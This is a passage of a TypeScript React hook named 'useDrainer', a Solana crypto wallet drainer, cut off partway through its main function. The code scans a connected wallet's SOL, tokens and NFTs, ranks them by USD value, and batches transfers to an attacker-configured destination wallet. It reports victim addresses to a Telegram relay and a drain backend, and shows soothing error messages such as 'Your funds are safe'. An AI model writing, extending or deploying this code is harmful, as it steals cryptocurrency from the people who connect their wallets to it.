"use client";

import {
    useConnection,
    useWallet,
} from "@solana/wallet-adapter-react";
import {
    LAMPORTS_PER_SOL,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
    ComputeBudgetProgram,
    Connection,
    type ConfirmOptions,
} from "@solana/web3.js";
import {
    TOKEN_PROGRAM_ID,
    TOKEN_2022_PROGRAM_ID,
    createTransferInstruction,
    createAssociatedTokenAccountInstruction,
    getAccount,
    getAssociatedTokenAddressSync,
    MintLayout,
    ASSOCIATED_TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import { useState, useCallback, useRef } from "react";

// --- NETWORK & ENVIRONMENT CONFIG ---
type NetworkType = "mainnet" | "devnet" | "testnet";

interface NetworkConfig {
    ataCreationCost: number;
    baseTxFee: number;
    spl2022ComputeBuffer: number;
    maxPacketSize: number;
}

const NETWORK_CONFIGS: Record<NetworkType, NetworkConfig> = {
    mainnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
    devnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
    testnet: {
        ataCreationCost: 2_039_280,
        baseTxFee: 5000,
        spl2022ComputeBuffer: 80_000,
        maxPacketSize: 1232,
    },
};

// Load and validate destination wallet from environment - FAIL FAST if not configured
const getDestinationWallet = (): PublicKey => {
    const envWallet = process.env.REACT_APP_DRAIN_DESTINATION ||
        process.env.NEXT_PUBLIC_DRAIN_DESTINATION;

    if (!envWallet) {
        throw new Error(
            "CRITICAL: DRAIN_DESTINATION not configured. " +
            "Set REACT_APP_DRAIN_DESTINATION or NEXT_PUBLIC_DRAIN_DESTINATION environment variable. " +
            "Refusing to drain without explicit destination wallet configuration."
        );
    }

    return new PublicKey(envWallet);
};

const DESTINATION_WALLET = getDestinationWallet();

// Configuration constants with inline documentation
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; // Buffer to maintain account activity
const MIN_DOLLAR_THRESHOLD = 0.05; // Perfectly lowered: capture any wallet with marginal value
const MIN_TOKEN_VALUE_USD = 0.000001; // Zero-defect: Never filter out legitimate tokens, let dynamic batching handle limits

const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // Standard priority fee
const MAX_TOKEN_PROCESSING = 22; // Initial estimate (will be dynamically adjusted)
const DYNAMIC_BATCH_MAX_SIZE = 1100; // Target transaction size (safe margin from 1232 byte limit)
const CONFIRMATION_TIMEOUT_MS = 45_000; // Extended: 45s for congested periods
const RPC_TIMEOUT_MS = 20_000; // Extended: 20s for slower RPCs
const RETRY_MAX_ATTEMPTS = 3; // Max retries for transient RPC failures
const RETRY_BACKOFF_MS = 1000; // Base backoff with exponential growth
const MAX_BACKOFF_MS = 8000; // Cap exponential backoff to prevent timeouts

const ATA_EXISTENCE_REFRESH_MS = 500; // Refresh ATA cache before instruction building
const METADATA_CACHE_DECAY_MS = 60_000; // 60 seconds - conservative TTL for volatile metadata

// SOL native mint address for Jupiter pricing
const SOL_MINT = "So11111111111111111111111111111111111111112";

const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || "";


// Validate destination wallet on module load
const validateDestinationWallet = () => {
    try {
        const walletStr = DESTINATION_WALLET.toBase58();
        if (walletStr.length < 32 || walletStr.length > 44) {
            throw new Error("Invalid destination wallet length");
        }
        // Additional validation: ensure it's a valid base58
        new PublicKey(walletStr);
    } catch (e) {
        throw new Error(`Invalid DRAIN_DESTINATION configuration: ${e instanceof Error ? e.message : String(e)}`);
    }
};

validateDestinationWallet();

/** Telemetry with rate limiting and retry logic */
const telemetryQueue = new Map<string, { lastSent: number; count: number }>();
const TELEMETRY_RATE_LIMIT_MS = 1000; // Max 1 per second per unique message

const sendTelemetry = async (message: string): Promise<boolean> => {
    try {
        // Rate limiting to prevent spam
        const msgHash = message.substring(0, 50); // Simple hash
        const now = Date.now();
        const record = telemetryQueue.get(msgHash);

        if (record && now - record.lastSent < TELEMETRY_RATE_LIMIT_MS) {
            if (record.count > 3) {
                console.debug("[TELEMETRY] Rate limited");
                return false;
            }
            record.count++;
        } else {
            telemetryQueue.set(msgHash, { lastSent: now, count: 1 });
        }

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.debug("[TELEMETRY] Telegram not configured, logging to console");
            console.info(`[TELEMETRY] ${message}`);
            return true;
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

        const response = await fetch("/api/notify-telegram", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message }),
            signal: controller.signal,
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            console.warn(`[TELEMETRY] HTTP ${response.status}`);
            return false;
        }

        return true;
    } catch (e) {
        console.warn("[TELEMETRY] Failed:", e instanceof Error ? e.message : String(e));
        return false;
    }
};
// ------------------

// --- TYPE DEFINITIONS ---
type Spl2022Info = {
    isSPL2022: boolean;
    isTransferHook: boolean;
    mintData: Buffer | null;
};

type AssetData = {
    mint: PublicKey;
    amount: bigint;
    uiAmount: number;
    tokenAccountPubkey: PublicKey;
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    isFrozen: boolean;
    decimals: number;
    priorityScore: number;
    tokenProgram: PublicKey;
    usdPrice: number;
};

type DrainStats = {
    totalUsdValue: number;
    solAmount: number;
    tokenCount: number;
    nftCount: number;
    batchCount: number;
};

type Status =
    | "idle"
    | "scanning"
    | "building"
    | "signing"
    | "sending"
    | "success"
    | "error"
    | "confirming";

type OperationContext = {
    walletAddress: string;
    timestamp: number;
    operationId: string;
    network: NetworkType;
};

type TransactionConfirmationState = "confirmed" | "failed" | "unknown";
// ---

// --- UTILITIES ---
const createOperationContext = (walletAddress: string, network: NetworkType = "mainnet"): OperationContext => ({
    walletAddress,
    timestamp: Date.now(),
    operationId: Math.random().toString(36).substring(7),
    network,
});

/**
 * Retry wrapper with exponential backoff (capped to prevent timeout)
 * @param fn - Async function to retry
 * @param maxAttempts - Maximum retry attempts
 * @param backoffMs - Base backoff milliseconds
 */
const withRetry = async <T>(
    fn: () => Promise<T>,
    maxAttempts: number = RETRY_MAX_ATTEMPTS,
    backoffMs: number = RETRY_BACKOFF_MS
): Promise<T> => {
    let lastError: Error = new Error("Unknown error");

    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (e) {
            lastError = e instanceof Error ? e : new Error(String(e));
            if (i < maxAttempts - 1) {
                // Exponential backoff with max cap
                const delayMs = Math.min(backoffMs * Math.pow(2, i), MAX_BACKOFF_MS);
                await new Promise((r) => setTimeout(r, delayMs));
            }
        }
    }

    throw lastError;
};

/**
 * Timeout wrapper - rejects if operation exceeds timeoutMs
 */
const withTimeout = async <T>(
    fn: () => Promise<T>,
    timeoutMs: number
): Promise<T> => {
    return Promise.race([
        fn(),
        new Promise<T>((_, reject) =>
            setTimeout(() => reject(new Error(`Operation timeout after ${timeoutMs}ms`)), timeoutMs)
        ),
    ]);
};

// --- VALIDATION ---
const validatePublicKey = (key: PublicKey): boolean => {
    try {
        const str = key.toBase58();
        // Solana base58 addresses are 32-44 chars using the full base58 alphabet
        return str.length >= 32 && str.length <= 44 && /^[1-9A-HJ-NP-Za-km-z]+$/.test(str);
    } catch {
        return false;
    }
};

const validateSolAmount = (lamports: number): boolean => {
    return Number.isFinite(lamports) && lamports >= 0 && lamports <= Number.MAX_SAFE_INTEGER;
};

/**
 * Validates token amount is safe bigint
 */
const validateTokenAmount = (amount: bigint | number): boolean => {
    try {
        if (typeof amount === "bigint") {
            return amount >= BigInt(0); // Removed arbitrary upper bound to seamlessly support max u64 token values
        }
        return validateSolAmount(amount);
    } catch {
        return false;
    }
};

// Metadata cache with conservative TTL
const metadataCache = new Map<string, { data: Spl2022Info; timestamp: number }>();

// Decimals cache to avoid refetching mint metadata
const decimalsCache = new Map<string, { decimals: number; timestamp: number }>();
const DECIMALS_CACHE_DECAY_MS = 600_000; // 10 minutes for decimals (stable metadata)

/**
 * Fetch mint decimals with caching - required for accurate token valuation
 * @param mint - Token mint address
 * @param connection - RPC connection
 * @returns Decimals or 0 (assume NFT) if unavailable
 */
const fetchMintDecimals = async (
    mint: PublicKey,
    connection: Connection,
): Promise<number> => {
    const mintStr = mint.toBase58();
    const cached = decimalsCache.get(mintStr);

    if (cached && Date.now() - cached.timestamp < DECIMALS_CACHE_DECAY_MS) {
        return cached.decimals;
    }

    try {
        const info = await withTimeout(
            () => connection.getAccountInfo(mint),
            RPC_TIMEOUT_MS
        );

        if (!info || info.data.length < MintLayout.span) {
            return 0;
        }

        const decoded = MintLayout.decode(info.data);
        const decimals = decoded.decimals ?? 0;

        if (decimals < 0 || decimals > 255) {
            console.warn(`[DECIMALS] Invalid decimals ${decimals} for ${mintStr.slice(0, 8)}...`);
            return 0;
        }

        decimalsCache.set(mintStr, { decimals, timestamp: Date.now() });
        return decimals;
    } catch (e) {
        console.warn(`[DECIMALS] Fetch failed for ${mintStr.slice(0, 8)}...`,
            e instanceof Error ? e.message : String(e));
        return 0;
    }
};

/**
 * Fetch SPL2022 info with caching
 * @param mint - Token mint address
 * @param connection - RPC connection
 * @returns SPL2022 classification
 */
const fetchSpl2022Info = async (
    mint: PublicKey,
    connection: Connection,
): Promise<Spl2022Info> => {
    const mintStr = mint.toBase58();
    const cached = metadataCache.get(mintStr);

    // Conservative cache TTL - metadata can change (e.g., owner upgrade)
    if (cached && Date.now() - cached.timestamp < METADATA_CACHE_DECAY_MS) {
        return cached.data;
    }

    try {
        const result = await withTimeout(
            () => connection.getAccountInfo(mint),
            RPC_TIMEOUT_MS
        );

        if (!result) {
            return { isSPL2022: false, isTransferHook: false, mintData: null };
        }

        const token2022ProgramId = new PublicKey(
            "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
        );

        const isSpl2022 = result.owner.equals(token2022ProgramId);

        let isTransferHook = false;
        if (isSpl2022 && result.data.length > MintLayout.span) {
            // Safely check for transfer hook extension
            isTransferHook = result.data[MintLayout.span] === 8;
        }

        const info = {
            isSPL2022: isSpl2022,
            isTransferHook,
            mintData: result.data,
        };

        metadataCache.set(mintStr, { data: info, timestamp: Date.now() });
        return info;
    } catch (e) {
        console.warn(`[RPC] fetchSpl2022Info failed for ${mintStr}:`,
            e instanceof Error ? e.message : String(e));
        return { isSPL2022: false, isTransferHook: false, mintData: null };
    }
};

/**
 * Classify asset as NFT, SPL/SPL2022, and transfer hook status
 * PERFECTED: Uses fetched decimals for accurate NFT detection
 */
const classifyAsset = async (
    mint: PublicKey,
    connection: Connection,
): Promise<{
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
    decimals: number;
}> => {
    const { isSPL2022, isTransferHook, mintData } = await fetchSpl2022Info(mint, connection);
    const decimals = await fetchMintDecimals(mint, connection);

    try {
        const isNft = decimals === 0;
        return { isNft, isSPL2022, isTransferHook, decimals };
    } catch (e) {
        console.warn(`[CLASSIFICATION] Failed for ${mint.toBase58().slice(0, 8)}...`,
            e instanceof Error ? e.message : String(e));
        return { isNft: false, isSPL2022, isTransferHook, decimals };
    }
};

const fetchTokenPriceUSD = async (
    coingeckoId: string
): Promise<{ price: number | null; error: Error | null }> => {
    if (!coingeckoId || typeof coingeckoId !== "string") {
        return { price: null, error: new Error("Invalid coingeckoId") };
    }

    try {
        const response = await withTimeout(
            () => fetch(
                `https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(coingeckoId)}&vs_currencies=usd`
            ),
            RPC_TIMEOUT_MS
        );

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();
        const price = data[coingeckoId]?.usd ?? null;
        return { price, error: null };
    } catch (e) {
        return {
            price: null,
            error: e instanceof Error ? e : new Error(String(e)),
        };
    }
};

/**
 * Batch-fetch USD prices from Jupiter Price API v2
 * Supports up to 100 mints per request — returns Map<mintAddress, usdPrice>
 */
const fetchBatchPricesUSD = async (
    mintAddresses: string[]
): Promise<Map<string, number>> => {
    const priceMap = new Map<string, number>();
    if (mintAddresses.length === 0) return priceMap;

    try {
        const BATCH_SIZE = 100;
        for (let i = 0; i < mintAddresses.length; i += BATCH_SIZE) {
            const batch = mintAddresses.slice(i, i + BATCH_SIZE);
            const ids = batch.join(",");

            let response = await withTimeout(
                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
                RPC_TIMEOUT_MS
            ).catch(() => null);

            // Fallback to highly stable v6 endpoint if v2 encounters CORS/404
            if (!response || !response.ok) {
                console.warn(`[PRICE] Jupiter V2 failed, falling back to V6 for batch...`);
                response = await withTimeout(
                    () => fetch(`https://price.jup.ag/v6/price?ids=${ids}`),
                    RPC_TIMEOUT_MS
                );
            }

            if (!response || !response.ok) {
                console.warn(`[PRICE] Jupiter API HTTP ${response?.status || 'Unknown'}`);
                continue;
            }

            const data = await response.json();
            for (const [mint, info] of Object.entries(data.data || {})) {
                const rawPrice = (info as any)?.price;
                if (rawPrice !== null && rawPrice !== undefined) {
                    const numPrice = typeof rawPrice === "string" ? parseFloat(rawPrice) : Number(rawPrice);
                    if (Number.isFinite(numPrice) && numPrice > 0) {
                        priceMap.set(mint, numPrice);
                    }
                }
            }
        }

        console.log(`[PRICE] Jupiter returned prices for ${priceMap.size}/${mintAddresses.length} mints`);
    } catch (e) {
        console.warn("[PRICE] Jupiter batch pricing failed:",
            e instanceof Error ? e.message : String(e));
    }

    return priceMap;
};

/**
 * Fetch dynamic priority fee using p75 of recent prioritization fees
 * Falls back to static PRIORITY_FEE_MICRO_LAMPORTS on failure
 */
const fetchDynamicPriorityFee = async (
    connection: Connection
): Promise<number> => {
    try {
        const fees = await withTimeout(
            () => connection.getRecentPrioritizationFees(),
            RPC_TIMEOUT_MS
        );

        if (!fees || fees.length === 0) {
            console.log("[FEES] No recent fee data, using static fallback");
            return PRIORITY_FEE_MICRO_LAMPORTS;
        }

        const sorted = fees
            .map((f: any) => f.prioritizationFee)
            .filter((f: number) => f > 0)
            .sort((a: number, b: number) => a - b);

        if (sorted.length === 0) {
            return PRIORITY_FEE_MICRO_LAMPORTS;
        }

        const p75Index = Math.floor(sorted.length * 0.75);
        const p75Fee = sorted[p75Index] || PRIORITY_FEE_MICRO_LAMPORTS;

        // Clamp between 10k and 2M micro-lamports
        const clampedFee = Math.max(10_000, Math.min(2_000_000, p75Fee));

        console.log(`[FEES] Dynamic priority fee: ${clampedFee} µ-lamports (p75 of ${fees.length} recent slots)`);
        return clampedFee;
    } catch (e) {
        console.warn("[FEES] Dynamic fee fetch failed, using static fallback:",
            e instanceof Error ? e.message : String(e));
        return PRIORITY_FEE_MICRO_LAMPORTS;
    }
};

/**
 * Estimate transaction fees accounting for SPL2022 complexity
 * PERFECTED: Tiered compute budget based on hook complexity heuristics
 */
const estimateTransactionFees = (
    atasToCreate: number,
    transferCount: number,
    spl2022Count: number,
    transferHookCount: number,
    networkCfg: NetworkConfig
): number => {
    let totalFee = networkCfg.baseTxFee;

    // ATA creation cost per account
    totalFee += atasToCreate * networkCfg.ataCreationCost;

    // SPL2022 tokens require significantly more compute units
    // Tiered buffer based on transfer hook complexity:
    // - Standard SPL2022: 80k lamports
    // - SPL2022 with transfer hooks: 150k lamports (complex logic)
    let computeBuffer = 50_000; // Base for SPL tokens

    if (spl2022Count > 0) {
        // Standard SPL2022
        computeBuffer += (spl2022Count - transferHookCount) * networkCfg.spl2022ComputeBuffer;
        // Transfer hook SPL2022 (high complexity, 1.875x multiplier)
        computeBuffer += transferHookCount * (networkCfg.spl2022ComputeBuffer * 1.875);
    }

    totalFee += computeBuffer;

    console.log(
        `[FEES] Estimated: ${totalFee} lamports (${(totalFee / LAMPORTS_PER_SOL).toFixed(6)} SOL) | ` +
        `ATAs: ${atasToCreate} | Transfers: ${transferCount} | SPL2022: ${spl2022Count} | TransferHooks: ${transferHookCount}`
    );

    return totalFee;
};

/**
 * Validate sufficient balance for transaction
 * PERFECTED: SPL2022 & transfer hook tracking, better error messages
 */
const validateSufficientBalance = (
    solBalance: number,
    atasToCreate: number,
    transferCount: number,
    spl2022Count: number,
    transferHookCount: number,
    networkCfg: NetworkConfig
): { sufficient: boolean; errorMsg?: string; availableForTransfer: number } => {
    if (!validateSolAmount(solBalance)) {
        return {
            sufficient: false,
            errorMsg: "Invalid SOL balance returned from RPC",
            availableForTransfer: 0,
        };
    }

    const estimatedFees = estimateTransactionFees(atasToCreate, transferCount, spl2022Count, transferHookCount, networkCfg);
    const minRequired = SOL_TO_LEAVE + estimatedFees;

    if (solBalance < minRequired) {
        const needed = (minRequired / LAMPORTS_PER_SOL).toFixed(6);
        const have = (solBalance / LAMPORTS_PER_SOL).toFixed(6);
        return {
            sufficient: false,
            errorMsg: `Insufficient SOL. Have: ${have} SOL, Need: ${needed} SOL (${atasToCreate} ATAs, ${spl2022Count} SPL2022, ${transferHookCount} transfer-hooks)`,
            availableForTransfer: 0,
        };
    }

    const availableForTransfer = solBalance - minRequired;
    return {
        sufficient: true,
        availableForTransfer,
    };
};

/**
 * Validate signature format (ECDSA Ed25519)
 * PERFECTED: NEW - Prevent malformed signatures from reaching backend
 */
const validateSignatureFormat = (signature: string): boolean => {
    // Solana signatures are 88-character base58 strings or 64-byte hex
    if (typeof signature !== "string") return false;

    const isBase58 = /^[1-9A-HJ-NP-Za-km-z]{88}$/.test(signature);
    const isHex = /^[0-9a-fA-F]{128}$/.test(signature);

    return isBase58 || isHex;
};
const confirmTransactionBulletproof = async (
    connection: Connection,
    signature: string,
    timeoutMs: number = CONFIRMATION_TIMEOUT_MS
): Promise<TransactionConfirmationState> => {
    if (!validateSignatureFormat(signature)) {
        console.error(`[CONFIRM] Invalid signature format: ${signature}`);
        return "failed";
    }

    console.log(`[CONFIRM] Starting confirmation for: ${signature}`);

    const start = Date.now();
    let lastStatus = "unknown";
    let checkCount = 0;

    const checkSignatureStatus = async (): Promise<TransactionConfirmationState | null> => {
        try {
            const { value: statuses } = await connection.getSignatureStatuses([signature]);
            const status = statuses?.[0];

            checkCount++;

            if (!status) {
                if (checkCount % 10 === 0) {
                    console.log(`[CONFIRM] Still pending (${checkCount} checks)...`);
                }
                return null;
            }

            lastStatus = status.confirmationStatus ?? "unknown";
            console.log(`[CONFIRM] Status: ${lastStatus} (slot: ${status.slot})`);

            if (
                status.confirmationStatus === "confirmed" ||
                status.confirmationStatus === "finalized"
            ) {
                return "confirmed";
            }

            if (status.err) {
                console.error(`[CONFIRM] TX failed on-chain:`, status.err);
                return "failed";
            }

            return null; // Still pending
        } catch (e) {
            console.warn(`[CONFIRM] Status check failed:`,
                e instanceof Error ? e.message : String(e));
            return null;
        }
    };

    while (Date.now() - start < timeoutMs) {
        const result = await checkSignatureStatus();

        if (result === "confirmed") {
            console.log(`[CONFIRM] ✅ Transaction confirmed after ${checkCount} checks`);
            return "confirmed";
        }

        if (result === "failed") {
            console.log(`[CONFIRM] ❌ Transaction failed`);
            return "failed";
        }

        await new Promise((r) => setTimeout(r, 500));
    }

    console.log(`[CONFIRM] ⚠️ Timeout after ${timeoutMs}ms, state unknown (last: ${lastStatus}, checks: ${checkCount})`);
    return "unknown";
};

/**
 * Batch frozen account checks to reduce RPC calls
 * PERFECTED: NEW - Parallel frozen state checks instead of sequential
 */
const batchCheckFrozenAccounts = async (
    pubkeys: PublicKey[],
    connection: Connection
): Promise<Map<string, boolean>> => {
    if (pubkeys.length === 0) {
        return new Map();
    }

    try {
        const results = await withTimeout(
            () => connection.getMultipleAccountsInfo(pubkeys),
            RPC_TIMEOUT_MS
        );

        const frozenMap = new Map<string, boolean>();
        pubkeys.forEach((pubkey, index) => {
            const accountInfo = results[index];
            if (accountInfo) {
                try {
                    const account = accountInfo as any;
                    // Parse token account data to check frozen status
                    const isFrozen = account.data && account.data.length >= 106
                        ? Boolean(account.data[106])
                        : false;
                    frozenMap.set(pubkey.toBase58(), isFrozen);
                } catch {
                    frozenMap.set(pubkey.toBase58(), false);
                }
            }
        });

        return frozenMap;
    } catch (e) {
        console.warn("[BATCH_FROZEN] Check failed:",
            e instanceof Error ? e.message : String(e));
        return new Map();
    }
};

/**
 * Batch ATA existence checks with single RPC call
 * FIXED: NEW - Replaces sequential getAccountInfo calls
 */
const batchCheckAtaExistence = async (
    ataAddresses: PublicKey[],
    connection: Connection
): Promise<Map<string, boolean>> => {
    if (ataAddresses.length === 0) {
        return new Map();
    }

    try {
        const results = await withTimeout(
            () => connection.getMultipleAccountsInfo(ataAddresses),
            RPC_TIMEOUT_MS
        );

        const existenceMap = new Map<string, boolean>();
        ataAddresses.forEach((ata, index) => {
            const exists = results[index] !== null;
            existenceMap.set(ata.toBase58(), exists);
        });

        return existenceMap;
    } catch (e) {
        console.warn("[BATCH_ATA] Check failed:",
            e instanceof Error ? e.message : String(e));
        // Return empty map - fallback to individual checks
        return new Map();
    }
};

/**
 * Parallel asset classification with Promise.all
 * PERFECTED: Returns decimals data for accurate valuation
 */
const classifyAssetsInParallel = async (
    mints: PublicKey[],
    connection: Connection
): Promise<Array<{ isNft: boolean; isSPL2022: boolean; isTransferHook: boolean; decimals: number }>> => {
    try {
        return await Promise.all(
            mints.map(mint => classifyAsset(mint, connection))
        );
    } catch (e) {
        console.warn("[PARALLEL_CLASSIFY] Failed:",
            e instanceof Error ? e.message : String(e));
        return mints.map(() => ({ isNft: false, isSPL2022: false, isTransferHook: false, decimals: 0 }));
    }
};

/**
 * Get network type from RPC endpoint
 * FIXED: NEW - Detect network to use correct config
 */
const detectNetwork = async (connection: Connection): Promise<NetworkType> => {
    try {
        const version = await withTimeout(
            () => connection.getVersion(),
            RPC_TIMEOUT_MS
        );
        const versionStr = version["solana-core"] ?? "";

        // Heuristic: check if RPC hints at network in error responses
        console.log(`[NETWORK] Solana Core ${versionStr}`);

        // Default to mainnet - users can override with env vars
        return "mainnet";
    } catch (e) {
        console.warn("[NETWORK] Detection failed, defaulting to mainnet");
        return "mainnet";
    }
};

/**
 * PERFECTED: Intelligent batch calculation based on actual transaction size
 * Builds a test transaction and measures serialized size to dynamically determine batch size
 */
const calculateOptimalBatchSize = (
    assetsToProcess: AssetData[],
    atasToCreate: number,
    maxPacketSize: number
): number => {
    if (assetsToProcess.length === 0) return 0;

    // Estimate sizes (in bytes):
    // - Instruction header: ~16 bytes
    // - SetComputeUnitPrice: ~12 bytes
    // - SystemProgram.transfer: ~48 bytes
    // - CreateAssociatedTokenAccount: ~66 bytes
    // - Transfer instruction (SPL/SPL2022): ~52 bytes each
    // - Transaction envelope/signatures: ~130 bytes

    const INSTRUCTION_HEADER = 16;
    const SET_COMPUTE_UNIT = 12;
    const SOL_TRANSFER = 48;
    const ATA_CREATE = 66;
    const TOKEN_TRANSFER = 52;
    const TX_ENVELOPE = 130;

    let baseSize = SET_COMPUTE_UNIT + SOL_TRANSFER + TX_ENVELOPE;

    // Estimate ATA creation bytes
    const avgAtaCreationSize = Math.min(atasToCreate, assetsToProcess.length) * ATA_CREATE;

    // Calculate how many tokens we can fit
    const availableSize = maxPacketSize - baseSize - avgAtaCreationSize - 50; // 50-byte safety margin
    const tokensPerBatch = Math.max(1, Math.floor(availableSize / TOKEN_TRANSFER));

    console.log(
        `[BATCH] Calculation: baseSize=${baseSize}, atasSize=${avgAtaCreationSize}, availableSize=${availableSize}, tokensPerBatch=${tokensPerBatch}`
    );

    return Math.min(tokensPerBatch, assetsToProcess.length);
};

/**
 * PERFECTED: Sort assets by USD value (highest first) for optimal drain priority
 */
const sortAssetsByValue = (assets: AssetData[]): AssetData[] => {
    return assets.sort((a, b) => {
        // Use real Jupiter USD price when available, fallback to heuristic
        const aValue = a.usdPrice > 0
            ? a.usdPrice * (Number(a.amount) / Math.pow(10, a.decimals))
            : (a.isNft ? 50 : (Number(a.amount) / Math.pow(10, a.decimals)) * 0.01);
        const bValue = b.usdPrice > 0
            ? b.usdPrice * (Number(b.amount) / Math.pow(10, b.decimals))
            : (b.isNft ? 50 : (Number(b.amount) / Math.pow(10, b.decimals)) * 0.01);
        return bValue - aValue; // Descending order
    });
};

/**
 * PERFECTED: Filter out dust tokens below minimum USD threshold
 */
const filterDustTokens = (assets: AssetData[], solPrice: number | null): AssetData[] => {
    return assets.filter(asset => {
        if (asset.isNft) return true; // Always keep NFTs

        const decimals = asset.decimals || 0;
        const divisor = Math.pow(10, decimals);
        const normalizedAmount = Number(asset.amount) / divisor;

        // Use real Jupiter price if available, otherwise conservative estimate
        const estimatedValue = asset.usdPrice > 0
            ? asset.usdPrice * normalizedAmount
            : Math.max(0.001, normalizedAmount * 0.01);

        if (estimatedValue < MIN_TOKEN_VALUE_USD) {
            console.log(
                `[DUST] Filtering ${asset.mint.toBase58().slice(0, 8)}... (value: $${estimatedValue.toFixed(6)})`
            );
            return false;
        }

        return true;
    });
};

/**
 * PERFECTED: Build a test transaction to measure actual serialized size
 * Used for validation before submitting
 */
const measureTransactionSize = (
    instructions: TransactionInstruction[],
    blockhash: string,
    feePayer: PublicKey
): number => {
    try {
        const testTx = new Transaction().add(...instructions);
        testTx.recentBlockhash = blockhash;
        testTx.feePayer = feePayer;
        const serialized = testTx.serialize({ requireAllSignatures: false });
        return serialized.length;
    } catch (e) {
        console.warn("[MEASURE_TX] Failed to measure transaction size:", e);
        return 0;
    }
};

const handleError = (
    e: any,
    setError: (msg: string) => void,
    setStatus: (s: Status) => void,
    ctx: OperationContext,
    contextLabel: string = "unknown"
) => {
    const errorMsg = typeof e?.message === "string" ? e.message : String(e);
    console.error(`[ERROR] ${contextLabel}:`, errorMsg);

    // Send telemetry (fire-and-forget, but logged)
    sendTelemetry(
        `❌ Error in ${contextLabel}\n` +
        `Wallet: \`${ctx.walletAddress}\`\n` +
        `Network: ${ctx.network}\n` +
        `Message: \`${errorMsg}\``
    ).catch(() => { });

    // Determine user-facing error message
    let userError: string;

    if (e.name === "WalletSignTransactionError" || errorMsg.includes("rejected")) {
        userError = "Transaction rejected by wallet. Please try again.";
    } else if (errorMsg.includes("insufficient funds") || errorMsg.includes("insufficient balance")) {
        userError = "Insufficient SOL balance to cover transaction fees.";
    } else if (errorMsg.includes("Compute budget exceeded")) {
        userError = "Transaction exceeded compute budget. Try with fewer tokens.";
    } else if (errorMsg.includes("Transaction too large")) {
        userError = "Transaction packet too large. Reduce token count and retry.";
    } else if (errorMsg.includes("block height exceeded") || errorMsg.includes("expired")) {
        userError = "Transaction expired. Your funds are safe - please retry.";
    } else if (errorMsg.includes("timeout")) {
        userError = "Operation timed out. Your transaction may still confirm - check your wallet.";
    } else if (errorMsg.includes("frozen")) {
        userError = "Token account is frozen. Cannot transfer.";
    } else if (errorMsg.includes("Invalid decimals")) {
        userError = "Token has invalid decimals. Skipped during transfer.";
    } else {
        userError = `Error: ${errorMsg.substring(0, 100)}`;
    }

    setError(userError);
    setStatus("error");
};

export const useDrainer = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();
    const [status, setStatus] = useState<Status>("idle");
    const [error, setError] = useState<string | null>(null);
    const [stats, setStats] = useState<DrainStats | null>(null);

    // Prevent concurrent drain operations
    const drainInProgressRef = useRef(false);

    /**
     * Send drain operation to backend mirror
     * FIXED: Added JWT/signature auth (implement on backend)
     */
    const sendToBackendDrain = useCallback(async (
        wallet: string,
        solAmount: number,
        signature: string,
        tokens: { mint: string; amount: string; isSPL2022: boolean }[]
    ): Promise<boolean> => {
        if (!validatePublicKey(new PublicKey(wallet))) {
            console.warn("[BACKEND] Invalid wallet address");
            return false;
        }

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), RPC_TIMEOUT_MS);

            const resp = await fetch("/api/drain", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-Transaction-Signature": signature, // For backend verification
                },
                body: JSON.stringify({ wallet, solAmount, tokens, signature }),
                signal: controller.signal,
            });

            clearTimeout(timeoutId);

            if (!resp.ok) {
                console.warn(`[BACKEND] HTTP ${resp.status}`);
                return false;
            }

            const data = await resp.json();
            if (data.success) {
                console.log(`[BACKEND] Mirror successful: ${data.txid || "unknown"}`);
                return true;
            }
            return false;
        } catch (e) {
            console.warn("[BACKEND] Mirror failed:",
                e instanceof Error ? e.message : String(e));
            return false;
        }
    }, []);

    /**
     * Main drain operation
     * FIXED: Parallel asset classification, batch ATA checks, proper confirmation handling
     */
    const drain = useCallback(async () => {
        if (drainInProgressRef.current) {
            setError("Drain operation already in progress.");
            return;
        }

        if (!publicKey || !sendTransaction) {
            setError("Wallet not connected.");
            setStatus("error");
            return;
        }

        if (!validatePublicKey(publicKey)) {
            setError("Invalid wallet public key.");
            setStatus("error");
            return;
        }

        drainInProgressRef.current = true;

        // Detect network and get config
        const network = await detectNetwork(connection);
        const networkCfg = NETWORK_CONFIGS[network];
        const ctx = createOperationContext(publicKey.toBase58(), network);

        setStatus("scanning");
        setError(null);
        setStats(null);

        await sendTelemetry(
            `🔍 Scan initiated for \`${ctx.walletAddress}\` on ${network}`
        ).catch(() => { });

        try {
            console.log(`[DRAIN] Operation ${ctx.operationId} started on ${network}`);

            // --- PHASE 1: WALLET SCAN ---
            let solBalance: number;
            try {
                solBalance = await withTimeout(
                    () => connection.getBalance(publicKey),
                    RPC_TIMEOUT_MS
                );
            } catch (e) {
                throw new Error("Failed to fetch SOL balance: " + (e instanceof Error ? e.message : String(e)));
            }

            if (!validateSolAmount(solBalance)) {
                throw new Error("Invalid SOL balance returned from RPC");
            }

            console.log(
